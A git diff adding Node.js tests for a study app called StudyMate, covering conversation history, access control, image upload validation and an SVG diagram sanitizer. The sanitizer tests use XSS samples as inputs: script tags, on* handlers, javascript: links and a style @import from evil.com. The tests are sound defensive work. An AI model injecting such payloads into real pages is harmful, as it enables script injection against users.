@@ -4,7 +4,7 @@ const dotenv = require('dotenv');
 // Load environment variables before resolving database URI
 dotenv.config({ path: path.resolve(__dirname, '../../.env') });
 
-const { describe, it, before, after, mock } = require('node:test');
+const { describe, it, before, after, beforeEach, afterEach, mock } = require('node:test');
 const assert = require('node:assert/strict');
 const request = require('supertest');
 const jwt = require('jsonwebtoken');
@@ -15,8 +15,10 @@ const User = require('../models/User');
 const Note = require('../models/Note');
 const QuizResult = require('../models/QuizResult');
 const AskUsage = require('../models/AskUsage');
+const Conversation = require('../models/Conversation');
 const geminiConfig = require('../config/gemini');
 const { getKolkataDateString } = require('../controllers/askController');
+const { sanitizeSvg, MAX_SVG_BYTES } = require('../utils/svgSanitizer');
 
 process.env.PORT = '5001';
 
@@ -274,6 +276,31 @@ describe('StudyMate API', () => {
     it('2.8 returns 400 "Invalid id" on quiz result route (GET /api/quiz/result/:id)', async () => {
       const res = await request(server)
         .get('/api/quiz/result/invalid-quiz-result-id')
+        .set('Authorization', authUser1);
+      assert.equal(res.status, 400);
+      assert.equal(res.body.message, 'Invalid id');
+    });
+
+    it('2.9 returns 400 "Invalid id" on conversation get (GET /api/ask/conversations/:id)', async () => {
+      const res = await request(server)
+        .get('/api/ask/conversations/invalid-conv-id')
+        .set('Authorization', authUser1);
+      assert.equal(res.status, 400);
+      assert.equal(res.body.message, 'Invalid id');
+    });
+
+    it('2.10 returns 400 "Invalid id" on conversation rename (PATCH /api/ask/conversations/:id)', async () => {
+      const res = await request(server)
+        .patch('/api/ask/conversations/invalid-conv-id')
+        .set('Authorization', authUser1)
+        .send({ title: 'New Title' });
+      assert.equal(res.status, 400);
+      assert.equal(res.body.message, 'Invalid id');
+    });
+
+    it('2.11 returns 400 "Invalid id" on conversation delete (DELETE /api/ask/conversations/:id)', async () => {
+      const res = await request(server)
+        .delete('/api/ask/conversations/invalid-conv-id')
         .set('Authorization', authUser1);
       assert.equal(res.status, 400);
       assert.equal(res.body.message, 'Invalid id');
@@ -833,6 +860,1266 @@ describe('StudyMate API', () => {
       } finally {
         mockGetClient.mock.restore();
         mockFallback.mock.restore();
+      }
+    });
+  });
+
+  // ==========================================
+  // ITEM 6: Ask AI Saved Conversation History
+  // ==========================================
+  describe('6. Ask AI Saved Conversation History', () => {
+    let convUser1;
+
+    beforeEach(async () => {
+      await Conversation.deleteMany({});
+
+      convUser1 = await Conversation.create({
+        user: user1._id,
+        title: 'Initial User1 Conversation',
+        messages: [
+          {
+            role: 'user',
+            content: 'What is an operating system kernel?',
+            mode: 'doubt',
+            createdAt: new Date(),
+          },
+          {
+            role: 'assistant',
+            content: 'The kernel is the core component of an operating system.',
+            mode: 'doubt',
+            createdAt: new Date(),
+          },
+        ],
+      });
+    });
+
+    afterEach(async () => {
+      await Conversation.deleteMany({});
+    });
+
+    it('6.1 user B gets 404 for user A conversation on GET /api/ask/conversations/:id', async () => {
+      const res = await request(server)
+        .get(`/api/ask/conversations/${convUser1._id}`)
+        .set('Authorization', authUser2);
+
+      assert.equal(res.status, 404);
+      assert.match(res.body.message, /not found/i);
+    });
+
+    it('6.2 user B gets 404 for user A conversation on PATCH /api/ask/conversations/:id', async () => {
+      const res = await request(server)
+        .patch(`/api/ask/conversations/${convUser1._id}`)
+        .set('Authorization', authUser2)
+        .send({ title: 'Hacked Title By User 2' });
+
+      assert.equal(res.status, 404);
+      assert.match(res.body.message, /not found/i);
+    });
+
+    it('6.3 user B gets 404 for user A conversation on DELETE /api/ask/conversations/:id', async () => {
+      const res = await request(server)
+        .delete(`/api/ask/conversations/${convUser1._id}`)
+        .set('Authorization', authUser2);
+
+      assert.equal(res.status, 404);
+      assert.match(res.body.message, /not found/i);
+
+      // Verify User A conversation still exists in database
+      const existing = await Conversation.findById(convUser1._id);
+      assert.ok(existing);
+    });
+
+    it('6.4 user B gets 404 when sending user A conversationId to POST /api/ask', async () => {
+      const res = await request(server)
+        .post('/api/ask')
+        .set('Authorization', authUser2)
+        .send({
+          question: 'Can I access this chat?',
+          mode: 'doubt',
+          conversationId: convUser1._id.toString(),
+        });
+
+      assert.equal(res.status, 404);
+      assert.match(res.body.message, /not found/i);
+    });
+
+    it('6.5 generates title from first 60 chars of question on new conversation and returns conversationId', async () => {
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockFallback = mock.method(
+        geminiConfig,
+        'generateWithModelFallback',
+        async () => 'Virtual memory maps virtual addresses to physical RAM using page tables.'
+      );
+
+      const longQuestion = 'Explain how virtual memory paging and page tables work in modern 64-bit operating systems in detail';
+      const expectedTitle = longQuestion.slice(0, 60);
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authUser1)
+          .send({
+            question: longQuestion,
+            mode: 'mark8',
+          });
+
+        assert.equal(res.status, 200);
+        assert.ok(res.body.conversationId);
+        assert.equal(res.body.mode, 'mark8');
+        assert.match(res.body.answer, /virtual memory/i);
+
+        const savedConv = await Conversation.findById(res.body.conversationId);
+        assert.ok(savedConv);
+        assert.equal(savedConv.title, expectedTitle);
+        assert.equal(savedConv.title.length, 60);
+        assert.equal(savedConv.messages.length, 2);
+        assert.equal(savedConv.messages[0].role, 'user');
+        assert.equal(savedConv.messages[0].content, longQuestion);
+        assert.equal(savedConv.messages[1].role, 'assistant');
+        assert.equal(savedConv.messages[1].content, res.body.answer);
+      } finally {
+        mockGetClient.mock.restore();
+        mockFallback.mock.restore();
+      }
+    });
+
+    it('6.6 enforces 30-conversation limit per user (returns 400 telling user to delete one)', async () => {
+      await Conversation.deleteMany({ user: user1._id });
+      const seedConversations = Array.from({ length: 30 }, (_, i) => ({
+        user: user1._id,
+        title: `Conversation ${i + 1}`,
+        messages: [{ role: 'user', content: `Q ${i + 1}`, createdAt: new Date() }],
+      }));
+      await Conversation.insertMany(seedConversations);
+
+      const res = await request(server)
+        .post('/api/ask')
+        .set('Authorization', authUser1)
+        .send({
+          question: 'Will this 31st conversation be blocked?',
+          mode: 'doubt',
+        });
+
+      assert.equal(res.status, 400);
+      assert.match(res.body.message, /30/);
+      assert.match(res.body.message, /delete/i);
+    });
+
+    it('6.7 enforces 40-message limit per conversation (returns 400 asking to start new chat)', async () => {
+      const fullMessages = Array.from({ length: 40 }, (_, i) => ({
+        role: i % 2 === 0 ? 'user' : 'assistant',
+        content: `Message content ${i + 1}`,
+        createdAt: new Date(),
+      }));
+
+      const fullConv = await Conversation.create({
+        user: user1._id,
+        title: 'Conversation With 40 Messages',
+        messages: fullMessages,
+      });
+
+      const res = await request(server)
+        .post('/api/ask')
+        .set('Authorization', authUser1)
+        .send({
+          question: 'Can I add a 41st message to this chat?',
+          mode: 'doubt',
+          conversationId: fullConv._id.toString(),
+        });
+
+      assert.equal(res.status, 400);
+      assert.match(res.body.message, /40/);
+      assert.match(res.body.message, /new chat/i);
+    });
+
+    it('6.8 sends previous messages as context to Gemini (last 10 messages, cut to 1500 chars as passive data)', async () => {
+      const messages = Array.from({ length: 12 }, (_, i) => ({
+        role: i % 2 === 0 ? 'user' : 'assistant',
+        content: i < 2 ? `OldMessage_${i}` : `RecentMessage_${i}_` + 'x'.repeat(1600),
+        createdAt: new Date(),
+      }));
+
+      const historyConv = await Conversation.create({
+        user: user1._id,
+        title: 'Context Verification Chat',
+        messages,
+      });
+
+      let capturedPrompt = '';
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockFallback = mock.method(
+        geminiConfig,
+        'generateWithModelFallback',
+        async (prompt) => {
+          capturedPrompt = prompt;
+          return 'Contextual answer generated.';
+        }
+      );
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authUser1)
+          .send({
+            question: 'What was my previous question about?',
+            mode: 'doubt',
+            conversationId: historyConv._id.toString(),
+          });
+
+        assert.equal(res.status, 200);
+        assert.ok(capturedPrompt.includes('=== BEGIN CONVERSATION HISTORY ==='));
+        assert.ok(capturedPrompt.includes('=== END CONVERSATION HISTORY ==='));
+        assert.ok(capturedPrompt.includes('CRITICAL INSTRUCTION FOR CONVERSATION HISTORY'));
+        // Message 0 and 1 should not be in the prompt (only last 10 messages: index 2 to 11)
+        assert.equal(capturedPrompt.includes('OldMessage_0'), false);
+        assert.equal(capturedPrompt.includes('OldMessage_1'), false);
+        assert.equal(capturedPrompt.includes('RecentMessage_2_'), true);
+        assert.equal(capturedPrompt.includes('RecentMessage_11_'), true);
+        // Verify truncation: 1600 'x's should be sliced to ensure each message is <= 1500 chars
+        assert.equal(capturedPrompt.includes('x'.repeat(1501)), false);
+        assert.equal(capturedPrompt.includes('x'.repeat(1400)), true);
+      } finally {
+        mockGetClient.mock.restore();
+        mockFallback.mock.restore();
+      }
+    });
+
+    it('6.9 nothing is saved in database when Gemini fails (mock) on new conversation', async () => {
+      const countBefore = await Conversation.countDocuments({ user: user1._id });
+
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockFallback = mock.method(
+        geminiConfig,
+        'generateWithModelFallback',
+        async () => {
+          throw new Error('Gemini API timeout or rate limit');
+        }
+      );
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authUser1)
+          .send({
+            question: 'This question will fail during AI generation',
+            mode: 'doubt',
+          });
+
+        assert.equal(res.status, 503);
+
+        const countAfter = await Conversation.countDocuments({ user: user1._id });
+        assert.equal(countAfter, countBefore, 'No new conversation document should be saved on Gemini failure');
+      } finally {
+        mockGetClient.mock.restore();
+        mockFallback.mock.restore();
+      }
+    });
+
+    it('6.10 nothing is saved in database when Gemini fails (mock) on existing conversation', async () => {
+      const messagesBefore = convUser1.messages.length;
+
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockFallback = mock.method(
+        geminiConfig,
+        'generateWithModelFallback',
+        async () => {
+          throw new Error('Gemini upstream network outage');
+        }
+      );
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authUser1)
+          .send({
+            question: 'This follow-up question will fail',
+            mode: 'doubt',
+            conversationId: convUser1._id.toString(),
+          });
+
+        assert.equal(res.status, 503);
+
+        const refreshed = await Conversation.findById(convUser1._id);
+        assert.equal(refreshed.messages.length, messagesBefore, 'No messages should be appended on Gemini failure');
+      } finally {
+        mockGetClient.mock.restore();
+        mockFallback.mock.restore();
+      }
+    });
+
+    it('6.11 delete conversation works (returns 200, conversation removed from DB)', async () => {
+      const resDelete = await request(server)
+        .delete(`/api/ask/conversations/${convUser1._id}`)
+        .set('Authorization', authUser1);
+
+      assert.equal(resDelete.status, 200);
+      assert.match(resDelete.body.message, /deleted/i);
+
+      const resGet = await request(server)
+        .get(`/api/ask/conversations/${convUser1._id}`)
+        .set('Authorization', authUser1);
+
+      assert.equal(resGet.status, 404);
+
+      const dbCheck = await Conversation.findById(convUser1._id);
+      assert.equal(dbCheck, null);
+    });
+
+    it('6.12 GET /api/ask/conversations returns list newest first with id, title, updatedAt', async () => {
+      const convOlder = await Conversation.create({
+        user: user1._id,
+        title: 'Older Chat',
+        updatedAt: new Date(Date.now() - 10000),
+      });
+
+      const convNewer = await Conversation.create({
+        user: user1._id,
+        title: 'Newer Chat',
+        updatedAt: new Date(),
+      });
+
+      const res = await request(server)
+        .get('/api/ask/conversations')
+        .set('Authorization', authUser1);
+
+      assert.equal(res.status, 200);
+      assert.ok(Array.isArray(res.body.conversations));
+      const titles = res.body.conversations.map((c) => c.title);
+      assert.ok(titles.indexOf('Newer Chat') < titles.indexOf('Older Chat'), 'Must be sorted newest first');
+
+      const first = res.body.conversations[0];
+      assert.ok(first.id);
+      assert.ok(first.title);
+      assert.ok(first.updatedAt);
+    });
+
+    it('6.13 PATCH /api/ask/conversations/:id renames title (1..80) and rejects invalid title with 400', async () => {
+      const resValid = await request(server)
+        .patch(`/api/ask/conversations/${convUser1._id}`)
+        .set('Authorization', authUser1)
+        .send({ title: 'New Renamed Title' });
+
+      assert.equal(resValid.status, 200);
+      assert.equal(resValid.body.conversation.title, 'New Renamed Title');
+
+      const updated = await Conversation.findById(convUser1._id);
+      assert.equal(updated.title, 'New Renamed Title');
+
+      const resEmpty = await request(server)
+        .patch(`/api/ask/conversations/${convUser1._id}`)
+        .set('Authorization', authUser1)
+        .send({ title: '   ' });
+
+      assert.equal(resEmpty.status, 400);
+
+      const resTooLong = await request(server)
+        .patch(`/api/ask/conversations/${convUser1._id}`)
+        .set('Authorization', authUser1)
+        .send({ title: 'a'.repeat(81) });
+
+      assert.equal(resTooLong.status, 400);
+
+      const resNonString = await request(server)
+        .patch(`/api/ask/conversations/${convUser1._id}`)
+        .set('Authorization', authUser1)
+        .send({ title: 12345 });
+
+      assert.equal(resNonString.status, 400);
+    });
+
+    it('6.14 POST /api/ask rejects invalid conversationId format with 400', async () => {
+      const res = await request(server)
+        .post('/api/ask')
+        .set('Authorization', authUser1)
+        .send({
+          question: 'Explain deadlock handling',
+          mode: 'doubt',
+          conversationId: 'not-a-valid-id',
+        });
+
+      assert.equal(res.status, 400);
+      assert.match(res.body.message, /invalid conversationId/i);
+    });
+  });
+
+  // ==========================================
+  // ITEM 7: Ask AI Image Upload
+  // ==========================================
+  describe('7. Ask AI Image Upload', () => {
+    let imageUser;
+    let authImageUser;
+
+    const validPngBuffer = Buffer.from([
+      0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d,
+      0x49, 0x48, 0x44, 0x52,
+    ]);
+
+    const validJpegBuffer = Buffer.from([
+      0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01,
+      0x01, 0x01, 0x00, 0x60,
+    ]);
+
+    const validWebpBuffer = Buffer.concat([
+      Buffer.from('RIFF'),
+      Buffer.alloc(4),
+      Buffer.from('WEBP'),
+      Buffer.from('VP8 '),
+    ]);
+
+    before(async () => {
+      imageUser = await User.create({
+        name: 'Image Test Student',
+        email: `imagestudent_${Date.now()}@test.edu`,
+        password: 'password123',
+      });
+      authImageUser = `Bearer ${jwt.sign({ id: imageUser._id }, getJwtSecret(), { expiresIn: '1h' })}`;
+    });
+
+    beforeEach(async () => {
+      await Conversation.deleteMany({});
+      const today = getKolkataDateString();
+      if (imageUser) {
+        await AskUsage.deleteOne({ user: imageUser._id, date: today });
+      }
+    });
+
+    afterEach(async () => {
+      await Conversation.deleteMany({});
+      const today = getKolkataDateString();
+      if (imageUser) {
+        await AskUsage.deleteOne({ user: imageUser._id, date: today });
+      }
+    });
+
+    it('7.1 accepts a valid PNG image upload with mock Gemini and saves hasImage: true', async () => {
+      let capturedPayload = null;
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockFallback = mock.method(
+        geminiConfig,
+        'generateWithModelFallback',
+        async (payload) => {
+          capturedPayload = payload;
+          return 'The diagram depicts a binary search tree balanced structure.';
+        }
+      );
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authImageUser)
+          .field('question', 'What does this diagram show?')
+          .field('mode', 'doubt')
+          .attach('image', validPngBuffer, 'diagram.png');
+
+        assert.equal(res.status, 200);
+        assert.ok(res.body.conversationId);
+        assert.match(res.body.answer, /binary search tree/i);
+
+        // Verify multimodal payload sent to Gemini
+        assert.ok(Array.isArray(capturedPayload));
+        assert.equal(capturedPayload.length, 2);
+        assert.ok(capturedPayload[0].includes('=== IMAGE INSTRUCTIONS ==='));
+        assert.ok(capturedPayload[0].includes('NEVER guess or assume handwriting'));
+        assert.equal(capturedPayload[1].inlineData.mimeType, 'image/png');
+        assert.equal(capturedPayload[1].inlineData.data, validPngBuffer.toString('base64'));
+
+        // Verify Conversation record hasImage: true
+        const savedConv = await Conversation.findById(res.body.conversationId);
+        assert.ok(savedConv);
+        assert.equal(savedConv.messages[0].hasImage, true);
+        assert.equal(savedConv.messages[1].hasImage, false);
+      } finally {
+        mockGetClient.mock.restore();
+        mockFallback.mock.restore();
+      }
+    });
+
+    it('7.2 accepts a valid JPEG image upload with mock Gemini', async () => {
+      let capturedPayload = null;
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockFallback = mock.method(
+        geminiConfig,
+        'generateWithModelFallback',
+        async (payload) => {
+          capturedPayload = payload;
+          return 'JPEG photo processed successfully.';
+        }
+      );
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authImageUser)
+          .field('question', 'Explain this formula')
+          .field('mode', 'mark2')
+          .attach('image', validJpegBuffer, 'formula.jpg');
+
+        assert.equal(res.status, 200);
+        assert.ok(Array.isArray(capturedPayload));
+        assert.equal(capturedPayload[1].inlineData.mimeType, 'image/jpeg');
+
+        const savedConv = await Conversation.findById(res.body.conversationId);
+        assert.equal(savedConv.messages[0].hasImage, true);
+      } finally {
+        mockGetClient.mock.restore();
+        mockFallback.mock.restore();
+      }
+    });
+
+    it('7.3 accepts a valid WebP image upload with mock Gemini', async () => {
+      let capturedPayload = null;
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockFallback = mock.method(
+        geminiConfig,
+        'generateWithModelFallback',
+        async (payload) => {
+          capturedPayload = payload;
+          return 'WebP image analyzed.';
+        }
+      );
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authImageUser)
+          .field('question', 'Analyze this textbook page')
+          .field('mode', 'simple')
+          .attach('image', validWebpBuffer, 'textbook.webp');
+
+        assert.equal(res.status, 200);
+        assert.ok(Array.isArray(capturedPayload));
+        assert.equal(capturedPayload[1].inlineData.mimeType, 'image/webp');
+      } finally {
+        mockGetClient.mock.restore();
+        mockFallback.mock.restore();
+      }
+    });
+
+    it('7.4 uses default question when image is uploaded without a question', async () => {
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockFallback = mock.method(
+        geminiConfig,
+        'generateWithModelFallback',
+        async () => 'Explaining the attached image content.'
+      );
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authImageUser)
+          .field('mode', 'doubt')
+          .attach('image', validPngBuffer, 'photo.png');
+
+        assert.equal(res.status, 200);
+
+        const savedConv = await Conversation.findById(res.body.conversationId);
+        assert.ok(savedConv);
+        const expectedDefault = 'Explain what is shown in this image and answer anything that is asked in it.';
+        assert.equal(savedConv.messages[0].content, expectedDefault);
+        assert.equal(savedConv.title, expectedDefault.slice(0, 60));
+      } finally {
+        mockGetClient.mock.restore();
+        mockFallback.mock.restore();
+      }
+    });
+
+    it('7.5 rejects a text file renamed to .png by magic bytes check (400)', async () => {
+      const textBuffer = Buffer.from('This is plain text pretending to be a png file.');
+
+      const res = await request(server)
+        .post('/api/ask')
+        .set('Authorization', authImageUser)
+        .field('question', 'Explain this file')
+        .field('mode', 'doubt')
+        .attach('image', textBuffer, 'fake.png');
+
+      assert.equal(res.status, 400);
+      assert.match(res.body.message, /invalid image format/i);
+    });
+
+    it('7.6 rejects an SVG upload with 400', async () => {
+      const svgBuffer = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><circle cx="50" cy="50" r="40"/></svg>');
+
+      const res = await request(server)
+        .post('/api/ask')
+        .set('Authorization', authImageUser)
+        .field('question', 'Explain this SVG')
+        .field('mode', 'doubt')
+        .attach('image', svgBuffer, 'vector.svg');
+
+      assert.equal(res.status, 400);
+      assert.match(res.body.message, /invalid image format/i);
+    });
+
+    it('7.7 rejects a file over 4 MB with 413 or 400', async () => {
+      const oversizedBuffer = Buffer.alloc(4 * 1024 * 1024 + 1024, 0x89);
+
+      const res = await request(server)
+        .post('/api/ask')
+        .set('Authorization', authImageUser)
+        .field('question', 'Explain this big file')
+        .field('mode', 'doubt')
+        .attach('image', oversizedBuffer, 'huge.png');
+
+      assert.ok([400, 413].includes(res.status), `Expected 413 or 400, got ${res.status}`);
+      assert.match(res.body.message, /4 MB/i);
+    });
+
+    it('7.8 verifies memory storage: no uploaded file is written to disk', async () => {
+      const fs = require('fs');
+
+      const uploadsDir = path.resolve(__dirname, '../../uploads');
+      const dirExistsBefore = fs.existsSync(uploadsDir);
+      const filesBefore = dirExistsBefore ? fs.readdirSync(uploadsDir) : [];
+
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockFallback = mock.method(
+        geminiConfig,
+        'generateWithModelFallback',
+        async () => 'Memory-only image analyzed.'
+      );
+
+      try {
+        const res = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authImageUser)
+          .field('question', 'Verify no disk persistence')
+          .field('mode', 'mark2')
+          .attach('image', validPngBuffer, 'disk-check.png');
+
+        assert.equal(res.status, 200);
+
+        if (fs.existsSync(uploadsDir)) {
+          const filesAfter = fs.readdirSync(uploadsDir);
+          assert.equal(filesAfter.length, filesBefore.length, 'No file should be written to uploads folder');
+        }
+      } finally {
+        mockGetClient.mock.restore();
+        mockFallback.mock.restore();
+      }
+    });
+
+    it('7.9 image request counts toward the existing daily cap and triggers 429 when cap is hit', async () => {
+      const today = getKolkataDateString();
+
+      // Clean start for imageUser usage today
+      await AskUsage.deleteOne({ user: imageUser._id, date: today });
+
+      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+      const mockFallback = mock.method(
+        geminiConfig,
+        'generateWithModelFallback',
+        async () => 'Quota counting image response.'
+      );
+
+      try {
+        // 1. Successful request increments count
+        const res1 = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authImageUser)
+          .field('question', 'First image request')
+          .field('mode', 'doubt')
+          .attach('image', validPngBuffer, 'img1.png');
+
+        assert.equal(res1.status, 200);
+        const usage1 = await AskUsage.findOne({ user: imageUser._id, date: today });
+        assert.equal(usage1.count, 1, 'AskUsage count must increment to 1');
+
+        // 2. Set count to 40 (cap reached)
+        await AskUsage.updateOne(
+          { user: imageUser._id, date: today },
+          { count: 40 }
+        );
+
+        const res2 = await request(server)
+          .post('/api/ask')
+          .set('Authorization', authImageUser)
+          .field('question', 'Blocked image request')
+          .field('mode', 'doubt')
+          .attach('image', validPngBuffer, 'img2.png');
+
+        assert.equal(res2.status, 429);
+        assert.match(res2.body.message, /daily ask limit reached/i);
+      } finally {
+        mockGetClient.mock.restore();
+        mockFallback.mock.restore();
+        await AskUsage.deleteOne({ user: imageUser._id, date: today });
+      }
+    });
+  });
+
+  // ==========================================
+  // ITEM 8: Ask AI Diagram (SVG) Mode
+  // ==========================================
+  describe('8. Ask AI Diagram (SVG) Mode', () => {
+    let svgUser;
+    let authSvgUser;
+
+    before(async () => {
+      svgUser = await User.create({
+        name: 'SVG Diagram Test Student',
+        email: `svgstudent_${Date.now()}@test.edu`,
+        password: 'password123',
+      });
+      authSvgUser = `Bearer ${jwt.sign({ id: svgUser._id }, getJwtSecret(), { expiresIn: '1h' })}`;
+    });
+
+    beforeEach(async () => {
+      await Conversation.deleteMany({});
+      const today = getKolkataDateString();
+      if (svgUser) {
+        await AskUsage.deleteMany({ user: svgUser._id });
+      }
+    });
+
+    // Sanitizer Unit Tests
+    describe('8.A SVG Sanitizer Unit Tests', () => {
+      it('8.1 strips <script> tags and inner code from SVG', () => {
+        const malicious = '<svg viewBox="0 0 100 100"><script>alert("xss")</script><circle cx="50" cy="50" r="20"/></svg>';
+        const result = sanitizeSvg(malicious);
+        assert.ok(result.svg, 'Sanitized SVG should be returned');
+        assert.equal(result.isOversized, false);
+        assert.ok(!result.svg.includes('<script>'), 'Must not contain <script>');
+        assert.ok(!result.svg.includes('alert'), 'Must not contain script content');
+        assert.ok(result.svg.includes('<circle'), 'Must preserve valid SVG elements');
+      });
+
+      it('8.2 strips onload, onclick, and all on* event handler attributes', () => {
+        const malicious = '<svg onload="alert(1)"><circle onclick="alert(2)" onmouseover="alert(3)" cx="10" cy="10" r="5"/></svg>';
+        const result = sanitizeSvg(malicious);
+        assert.ok(result.svg);
+        assert.ok(!result.svg.includes('onload'), 'Must not contain onload');
+        assert.ok(!result.svg.includes('onclick'), 'Must not contain onclick');
+        assert.ok(!result.svg.includes('onmouseover'), 'Must not contain onmouseover');
+        assert.ok(!result.svg.includes('alert'), 'Must not contain handler code');
+        assert.ok(result.svg.includes('<circle'), 'Must preserve circle element');
+      });
+
+      it('8.3 strips <foreignObject> and <iframe> tags and inner content', () => {
+        const malicious = '<svg><foreignObject><div><script>alert(1)</script><p>Dangerous</p></div></foreignObject><iframe></iframe><rect width="10" height="10"/></svg>';
+        const result = sanitizeSvg(malicious);
+        assert.ok(result.svg);
+        assert.ok(!result.svg.includes('<foreignObject>'), 'Must not contain <foreignObject>');
+        assert.ok(!result.svg.includes('Dangerous'), 'Must not contain foreignObject text');
+        assert.ok(!result.svg.includes('<iframe'), 'Must not contain <iframe>');
+        assert.ok(result.svg.includes('<rect'), 'Must preserve rect');
+      });
+
+      it('8.4 strips javascript: links and external hrefs while preserving local "#" references', () => {
+        const input = '<svg><a href="javascript:alert(1)">bad</a><a href="https://malicious.com">external</a><use href="#icon-arrow" xlink:href="#icon-arrow"/></svg>';
+        const result = sanitizeSvg(input);
+        assert.ok(result.svg);
+        assert.ok(!result.svg.includes('javascript:'), 'Must strip javascript:');
+        assert.ok(!result.svg.includes('https://malicious.com'), 'Must strip external href');
+        assert.ok(result.svg.includes('href="#icon-arrow"'), 'Must keep local # href');
+        assert.ok(result.svg.includes('xlink:href="#icon-arrow"'), 'Must keep local # xlink:href');
+      });
+
+      it('8.5 strips <style> tags containing @import or external url(...) references', () => {
+        const malicious = '<svg><style>@import url("https://evil.com/evil.css"); .safe { fill: red; }</style><circle class="safe" r="5"/></svg>';
+        const result = sanitizeSvg(malicious);
+        assert.ok(result.svg);
+        assert.ok(!result.svg.includes('@import'), 'Must strip style with @import');
+        assert.ok(!result.svg.includes('evil.com'), 'Must strip external style reference');
+        assert.ok(result.svg.includes('<circle'), 'Must preserve circle element');
+      });
+
+      it('8.6 rejects oversized SVG output larger than 100 KB', () => {
+        const oversized = '<svg viewBox="0 0 100 100">' + '<path d="M0 0 L10 10"/>'.repeat(5000) + '</svg>';
+        assert.ok(Buffer.byteLength(oversized, 'utf8') > MAX_SVG_BYTES);
+        const result = sanitizeSvg(oversized);
+        assert.equal(result.svg, null);
+        assert.equal(result.isOversized, true);
+      });
+
+      it('8.7 rejects non-SVG or malformed output without <svg> tags', () => {
+        const result = sanitizeSvg('This is not an SVG diagram at all.');
+        assert.equal(result.svg, null);
+        assert.equal(result.isOversized, false);
+      });
+    });
+
+    // Endpoint Integration Tests
+    describe('8.B POST /api/ask Diagram (SVG) Mode Endpoint', () => {
+      it('8.8 passes valid SVG through with mock Gemini, returns { svg, description }, and persists to conversation', async () => {
+        const validDiagramResponse = `=== DESCRIPTION ===
+Flowchart of Binary Search Algorithm
+=== SVG ===
+<svg viewBox="0 0 400 200" xmlns="http://www.w3.org/2000/svg">
+  <rect x="20" y="20" width="100" height="40" rx="5" fill="#4f46e5" stroke="#3730a3" stroke-width="2"/>
+  <text x="70" y="45" fill="#ffffff" font-size="12" text-anchor="middle">Start</text>
+</svg>`;
+
+        const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+        const mockFallback = mock.method(
+          geminiConfig,
+          'generateWithModelFallback',
+          async () => validDiagramResponse
+        );
+
+        try {
+          const res = await request(server)
+            .post('/api/ask')
+            .set('Authorization', authSvgUser)
+            .send({
+              question: 'Draw a flowchart of binary search algorithm',
+              mode: 'svg',
+            });
+
+          assert.equal(res.status, 200);
+          assert.equal(res.body.mode, 'svg');
+          assert.ok(res.body.svg, 'Should return svg field');
+          assert.ok(res.body.svg.startsWith('<svg'), 'svg must be valid SVG string');
+          assert.equal(res.body.description, 'Flowchart of Binary Search Algorithm');
+          assert.ok(res.body.conversationId, 'Should return conversationId');
+
+          // Verify conversation in DB
+          const savedConv = await Conversation.findById(res.body.conversationId);
+          assert.ok(savedConv);
+          assert.equal(savedConv.messages.length, 2);
+          assert.equal(savedConv.messages[1].role, 'assistant');
+          assert.equal(savedConv.messages[1].mode, 'svg');
+          assert.ok(savedConv.messages[1].svg.includes('<rect'), 'Saved message must contain svg');
+          assert.equal(savedConv.messages[1].description, 'Flowchart of Binary Search Algorithm');
+        } finally {
+          mockGetClient.mock.restore();
+          mockFallback.mock.restore();
+        }
+      });
+
+      it('8.9 returns 502 with clear message when Gemini output is not valid SVG', async () => {
+        const invalidResponse = 'I apologize, but I cannot generate a diagram for this topic.';
+
+        const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+        const mockFallback = mock.method(
+          geminiConfig,
+          'generateWithModelFallback',
+          async () => invalidResponse
+        );
+
+        try {
+          const res = await request(server)
+            .post('/api/ask')
+            .set('Authorization', authSvgUser)
+            .send({
+              question: 'Draw a diagram that fails',
+              mode: 'svg',
+            });
+
+          assert.equal(res.status, 502);
+          assert.equal(res.body.error, true);
+          assert.match(res.body.message, /valid SVG diagram/i);
+
+          // Verify nothing saved to conversation
+          const convCount = await Conversation.countDocuments({ user: svgUser._id });
+          assert.equal(convCount, 0, 'No conversation should be saved on 502 failure');
+        } finally {
+          mockGetClient.mock.restore();
+          mockFallback.mock.restore();
+        }
+      });
+
+      it('8.10 returns 502 with clear message when Gemini SVG output exceeds 100 KB', async () => {
+        const oversizedOutput = `=== DESCRIPTION ===
+Massive SVG
+=== SVG ===
+<svg viewBox="0 0 100 100">${'<path d="M0 0 L10 10"/>'.repeat(5000)}</svg>`;
+
+        const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
+        const mockFallback = mock.method(
+          geminiConfig,
+          'generateWithModelFallback',
+          async () => oversizedOutput
+        );
+
+        try {
+          const res = await request(server)
+            .post('/api/ask')
+            .set('Authorization', authSvgUser)
+            .send({
